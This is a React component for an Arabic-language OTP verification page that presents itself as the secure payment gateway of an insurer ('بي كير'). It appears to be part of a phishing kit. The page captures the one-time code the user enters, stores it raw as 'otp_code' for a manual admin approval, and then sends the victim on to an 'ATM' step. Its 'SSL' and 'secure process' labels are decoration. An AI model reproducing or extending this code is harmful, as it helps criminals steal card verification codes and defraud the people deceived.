import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Lock, RefreshCw, Loader2, CreditCard, Shield, Info } from "lucide-react";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";

const OTPVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const o = t.otp;
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "4532";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const approvalStatus = useAdminApproval(orderId, "otp");

  useEffect(() => { inputRef.current?.focus(); }, []);

  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  useEffect(() => {
    if (approvalStatus === "approved") {
      toast.success(o.verified);
      sessionStorage.setItem("insurance_order_id", orderId!);
      navigate("/insurance/atm", { state: { offer, orderId, cardLastFour } });
    } else if (approvalStatus === "rejected") {
      toast.error(o.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, cardLastFour, o.verified, o.rejected]);

  const handleVerify = async () => {
    if (otp.length < 4) return;
    setLoading(true);
    const id = await createOrUpdateStage(orderId, "otp", { otp_verified: false, otp_code: otp });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = async () => {
    setTimer(120); setCanResend(false); setOtp("");
    inputRef.current?.focus();

    const visitorSid = sessionStorage.getItem("visitor_sid");
    if (!orderId || !visitorSid) return;

    try {
      await supabase.rpc("insert_stage_event", {
        p_visitor_session_id: visitorSid,
        p_order_id: orderId,
        p_stage: "otp",
        p_status: "pending",
        p_payload: {
          resend_requested: true,
          source: "otp_page",
        },
      });
    } catch (error) {
      // resend log failed silently
    }
  };

  const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  return (
    <div className="relative min-h-[100dvh] overflow-hidden bg-gradient-to-b from-[hsl(var(--primary)/0.05)] via-background to-background">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,hsl(var(--primary)/0.08),transparent_60%)]" />

      <div className="container relative mx-auto px-4 pt-8 pb-24 md:pb-12">
        <div className="mx-auto max-w-md">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4, ease: "easeOut" }}
          >
            <div className="overflow-hidden rounded-3xl border border-primary/15 bg-card shadow-xl shadow-primary/5">
              {/* Header */}
              <div className="relative bg-gradient-to-l from-primary/10 via-primary/5 to-transparent px-5 py-5">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-1.5 rounded-full bg-primary/10 px-2.5 py-1">
                    <Lock className="h-3 w-3 text-primary" />
                    <span className="text-[10px] font-bold text-primary">SSL</span>
                  </div>
                  <div className="flex items-center gap-3 text-right">
                    <div>
                      <h1 className="text-base font-bold text-foreground">{o.title}</h1>
                      <p className="text-[11px] text-muted-foreground">بوابة دفع آمنة</p>
                    </div>
                    <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-primary/10">
                      <CreditCard className="h-5 w-5 text-primary" />
                    </div>
                  </div>
                </div>
              </div>

              <div className="space-y-4 p-5">
                {waitingApproval ? (
                  <WaitingApprovalOverlay
                    title={o.waitingApproval}
                    subtitle={o.waitingReview}
                  />
                ) : (
                  <>
                    {/* Transaction Info */}
                    <div className="divide-y divide-border/60 rounded-2xl border border-border/60 bg-secondary/30">
                      {[
                        { label: "التاجر", value: companyName },
                        { label: "المبلغ", value: `${totalPrice.toLocaleString()} ر.س`, bold: true },
                        { label: "البطاقة", value: `•••• ${cardLastFour}`, mono: true },
                      ].map((row, idx) => (
                        <div key={idx} className="flex items-center justify-between px-4 py-3">
                          <span className={`text-sm ${row.bold ? "font-extrabold text-foreground" : row.mono ? "font-mono tracking-widest text-foreground" : "font-semibold text-foreground"}`} dir="ltr">
                            {row.value}
                          </span>
                          <span className="text-xs text-muted-foreground">{row.label}</span>
                        </div>
                      ))}
                    </div>

                    {/* OTP Section */}
                    <div className="space-y-4 rounded-2xl border border-primary/10 bg-gradient-to-b from-primary/[0.03] to-transparent p-5">
                      <div className="space-y-1 text-center">
                        <p className="text-sm font-bold text-foreground">{o.subtitle}</p>
                        <p className="text-xs text-muted-foreground">تم إرسال رمز التحقق المكون من 6 أرقام إليك</p>
                      </div>

                      <div dir="ltr">
                        <input
                          ref={inputRef}
                          type="text"
                          inputMode="numeric"
                          value={otp}
                          onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                          placeholder="••••••"
                          className="w-full h-14 rounded-xl border-2 border-border/80 bg-background text-center text-lg font-bold tracking-[0.3em] text-foreground shadow-sm transition-all duration-200 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/15 focus:shadow-md"
                        />
                      </div>

                      {/* Timer / Resend */}
                      <div className="text-center">
                        {canResend ? (
                          <button onClick={handleResend} className="flex items-center gap-2 text-xs text-primary hover:text-primary/80 mx-auto font-medium">
                            <RefreshCw className="w-3.5 h-3.5" />{o.resendCode}
                          </button>
                        ) : (
                          <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-3 py-1">
                            <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
                            <span className="text-xs text-primary font-bold font-mono">{fmtTime(timer)}</span>
                          </div>
                        )}
                      </div>

                      {loading && (
                        <motion.div
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          className="flex items-center justify-center gap-2 rounded-xl bg-primary/5 py-2.5"
                        >
                          <Loader2 className="h-4 w-4 animate-spin text-primary" />
                          <span className="text-xs font-medium text-primary">{o.verifying}</span>
                        </motion.div>
                      )}

                      <button
                        onClick={handleVerify}
                        disabled={loading || otp.length < 4}
                        className="h-12 w-full rounded-xl bg-cta text-sm font-bold text-cta-foreground shadow-lg shadow-cta/20 transition-all hover:bg-cta-hover hover:shadow-xl hover:shadow-cta/30 disabled:opacity-40 flex items-center justify-center gap-2"
                      >
                        {loading ? (
                          <>
                            <Loader2 className="h-4 w-4 animate-spin" />
                            {o.verifying}
                          </>
                        ) : (
                          <>
                            <Lock className="h-4 w-4" />
                            {o.confirmPayment}
                          </>
                        )}
                      </button>
                    </div>
                  </>
                )}
              </div>

              {/* Footer */}
              <div className="border-t border-border/40 bg-secondary/20 px-5 py-3">
                <div className="flex items-center justify-center gap-2">
                  <Shield className="h-3.5 w-3.5 text-muted-foreground" />
                  <span className="text-[10px] text-muted-foreground">{o.secureProcess}</span>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
